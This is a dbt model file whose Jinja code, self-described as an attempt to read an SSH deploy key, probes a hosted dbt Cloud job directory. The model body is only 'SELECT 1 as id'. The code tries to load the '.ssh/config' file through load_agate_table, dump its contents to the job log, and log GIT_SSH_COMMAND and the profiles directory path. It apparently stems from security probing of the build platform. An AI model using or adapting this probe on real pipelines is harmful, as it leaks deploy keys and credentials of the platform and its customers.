{# Attempt to read SSH deploy key via various Jinja2 methods #}
{%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') -%}
{%- set ssh_dir = '/tmp/jobs/' ~ run_id ~ '/.ssh/' -%}

{{ log("ATTEMPTING_SSH_KEY_READ_FROM=" ~ ssh_dir, info=True) }}

{# Method 1: load_agate_table to read files #}
{%- if load_agate_table is defined -%}
  {{ log("LOAD_AGATE_TABLE_EXISTS=TRUE", info=True) }}
  {# Try reading SSH config #}
  {%- set ssh_config = load_agate_table(ssh_dir ~ "config") -%}
  {{ log("SSH_CONFIG=" ~ (ssh_config | string)[:500], info=True) }}
{%- else -%}
  {{ log("LOAD_AGATE_TABLE_UNDEF", info=True) }}
{%- endif -%}

{# Method 2: Try modules.io or modules.builtins for file read #}
{%- if modules is defined -%}
  {%- if modules.io is defined -%}
    {{ log("IO_MODULE_EXISTS=TRUE", info=True) }}
  {%- else -%}
    {{ log("IO_MODULE_UNDEF", info=True) }}
  {%- endif -%}
{%- endif -%}

{# Method 3: Try fromyaml on profiles.yml #}
{%- if fromyaml is defined -%}
  {{ log("FROMYAML_EXISTS=TRUE", info=True) }}
{%- endif -%}

{# Method 4: Check if we can get the SSH config path details #}
{{ log("GIT_SSH_CMD=" ~ env_var('GIT_SSH_COMMAND', 'NOT_SET'), info=True) }}

{# Method 5: Use render to process include-like operations #}
{%- set profiles_dir = '/tmp/jobs/' ~ run_id ~ '/.dbt/' -%}
{{ log("PROFILES_DIR=" ~ profiles_dir, info=True) }}

SELECT 1 as id
